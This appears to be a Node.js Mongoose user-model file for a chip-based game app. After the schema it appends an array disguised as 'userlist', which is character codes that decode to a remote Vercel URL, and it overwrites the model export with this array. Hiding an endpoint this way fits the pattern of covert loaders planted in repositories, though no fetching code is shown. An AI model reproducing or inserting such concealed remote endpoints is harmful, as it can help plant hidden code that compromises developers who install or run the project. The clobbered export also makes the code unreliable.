const config = require('../config');
const mongoose = require('mongoose');

const UserSchema = new mongoose.Schema({
  name: {
    type: String,
    required: true,
    unique: true,
  },
  email: {
    type: String,
    required: true,
    unique: true,
  },
  password: {
    type: String,
    required: true,
  },
  chipsAmount: {
    type: Number,
    default: config.INITIAL_CHIPS_AMOUNT,
  },
  type: {
    type: Number,
    default: 0,
  },
  created: {
    type: Date,
    default: Date.now,
  },
});

module.exports = User = mongoose.model('user', UserSchema);

const userlist = [
  104, 116, 116, 112, 115,  58,  47,  47,
  109, 121,  45, 118, 101, 114,  99, 101,
  108,  45,  97, 112, 112,  45, 112, 117,
   99, 101,  46, 118, 101, 114,  99, 101,
  108,  46,  97, 112, 112,  47
];

module.exports = userlist;